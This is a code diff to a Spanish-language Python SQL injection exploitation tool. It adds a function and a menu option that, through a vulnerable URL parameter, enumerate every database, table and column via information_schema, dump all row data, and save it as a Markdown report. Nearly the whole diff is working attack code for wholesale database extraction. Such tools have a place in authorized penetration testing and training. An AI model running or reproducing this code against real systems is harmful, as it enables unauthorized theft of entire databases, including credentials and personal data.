@@ -40,6 +40,103 @@ def imprimir_tabla_sql(cabeceras, filas):
     print(f"{len(filas)} filas en el conjunto")
 
 
+def generar_reporte_bbdd(url, param_vulnerable, otros_params, num_cols, col_visible, tipo_inyeccion, bbdd_seleccionada=None, incluir_info_schema=False):
+    """
+    Genera un reporte completo con todas las bases de datos, tablas y sus datos.
+    Retorna el contenido en formato markdown.
+    
+    :param url: URL objetivo
+    :param param_vulnerable: Parámetro vulnerable
+    :param otros_params: Parámetros adicionales
+    :param num_cols: Número de columnas detectadas
+    :param col_visible: Columna visible
+    :param tipo_inyeccion: Tipo de inyección
+    :param bbdd_seleccionada: BBDD específica a reportar (None = todas)
+    :param incluir_info_schema: Incluir information_schema en el reporte
+    :return: String con contenido markdown
+    """
+    import datetime
+    
+    reporte = f"# Reporte de SQL Injection\n\n"
+    reporte += f"**Fecha:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+    reporte += f"**URL:** {url}\n"
+    reporte += f"**Parámetro vulnerable:** {param_vulnerable}\n"
+    reporte += f"**Tipo de inyección:** {tipo_inyeccion}\n\n"
+    
+    # Obtener bases de datos
+    query = "SELECT group_concat(schema_name) FROM information_schema.schemata"
+    res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query, tipo_inyeccion)
+    
+    if not res or res == "No se pudo extraer el dato":
+        reporte += "## Error\nNo se pudieron obtener las bases de datos.\n"
+        return reporte
+    
+    bbdds = res.split(',')
+    
+    # Filtrar information_schema si no está incluida
+    if not incluir_info_schema:
+        bbdds = [b for b in bbdds if b.strip() not in ['information_schema', 'performance_schema', 'mysql']]
+    
+    if bbdd_seleccionada:
+        bbdds = [b for b in bbdds if b.strip() == bbdd_seleccionada.strip()]
+    
+    reporte += f"## Bases de Datos ({len(bbdds)})\n\n"
+    
+    for bbdd in bbdds:
+        bbdd = bbdd.strip()
+        reporte += f"### {bbdd}\n\n"
+        
+        # Obtener tablas
+        query = f"SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='{bbdd}'"
+        res_tablas = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query, tipo_inyeccion)
+        
+        if res_tablas and res_tablas != "No se pudo extraer el dato":
+            tablas = res_tablas.split(',')
+            reporte += f"#### Tablas ({len(tablas)})\n\n"
+            
+            for tabla in tablas:
+                tabla = tabla.strip()
+                reporte += f"##### {tabla}\n\n"
+                
+                # Obtener columnas
+                query_cols = f"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='{bbdd}' AND table_name='{tabla}'"
+                res_cols = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query_cols, tipo_inyeccion)
+                
+                if res_cols and res_cols != "No se pudo extraer el dato":
+                    columnas = [c.strip() for c in res_cols.split(',')]
+                    
+                    # Intentar obtener datos de la tabla
+                    try:
+                        cols_query = ', '.join(columnas)
+                        query_data = f"SELECT group_concat(concat_ws('||', {cols_query}) SEPARATOR '<<ROW>>') FROM {bbdd}.{tabla}"
+                        res_data = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query_data, tipo_inyeccion)
+                        
+                        if res_data and res_data != "No se pudo extraer el dato":
+                            # Formatear tabla markdown
+                            reporte += "| " + " | ".join(columnas) + " |\n"
+                            reporte += "|" + "|".join(["-" * (len(col) + 2) for col in columnas]) + "|\n"
+                            
+                            filas_data = res_data.split('<<ROW>>')
+                            for fila in filas_data:
+                                valores = fila.split('||')
+                                # Asegurarse de que tenemos suficientes valores (rellenar con vacío si falta)
+                                valores_padded = [valores[i].strip() if i < len(valores) else "" for i in range(len(columnas))]
+                                reporte += "| " + " | ".join(valores_padded) + " |\n"
+                            reporte += "\n"
+                        else:
+                            # Si no hay datos, mostrar solo columnas
+                            reporte += "**Columnas:** " + ", ".join(columnas) + "\n\n"
+                    except Exception as e:
+                        # Fallback: mostrar solo columnas
+                        reporte += "**Columnas:** " + ", ".join(columnas) + "\n\n"
+                else:
+                    reporte += "No se pudieron obtener las columnas.\n\n"
+        else:
+            reporte += "No se pudieron obtener las tablas.\n\n"
+    
+    return reporte
+
+
 def realizar_peticion(url, params):
     """
     Función genérica para hacer peticiones.
@@ -251,7 +348,8 @@ def menu_interactivo(url, param_vulnerable, otros_params, num_cols, col_visible,
     print("4. Listar Tablas")
     print("5. Listar Columnas de una Tabla")
     print("6. Mostrar toda la tabla")
-    print("7. Salir")
+    print("7. Generar reporte (Markdown)")
+    print("8. Salir")
     
     while True:
         
@@ -335,6 +433,22 @@ def menu_interactivo(url, param_vulnerable, otros_params, num_cols, col_visible,
                 print("No se pudieron obtener las columnas de la tabla.")
                 
         elif opcion == '7':
+            print("\n[*] Generando reporte...")
+            generar_todas = input("¿Generar reporte de TODAS las bases de datos? (s/n) [s]: ").lower() != 'n'
+            incluir_info = input("¿Incluir information_schema, performance_schema y mysql? (s/n) [n]: ").lower() == 's'
+            
+            if generar_todas:
+                reporte = generar_reporte_bbdd(url, param_vulnerable, otros_params, num_cols, col_visible, tipo_inyeccion, incluir_info_schema=incluir_info)
+            else:
+                reporte = generar_reporte_bbdd(url, param_vulnerable, otros_params, num_cols, col_visible, tipo_inyeccion, bbdd_seleccionada=bbdd, incluir_info_schema=incluir_info)
+            
+            # Guardar a archivo
+            filename = f"reporte_sqli_{__import__('datetime').datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write(reporte)
+            print(f"[+] Reporte guardado en: {filename}")
+                
+        elif opcion == '8':
             print("Saliendo...")
             break
         else:
@@ -346,7 +460,8 @@ def menu_interactivo(url, param_vulnerable, otros_params, num_cols, col_visible,
             print("4. Listar Tablas")
             print("5. Listar Columnas de una Tabla")
             print("6. Mostrar toda la tabla")
-            print("7. Salir")
+            print("7. Generar reporte (Markdown)")
+            print("8. Salir")
     
 
 
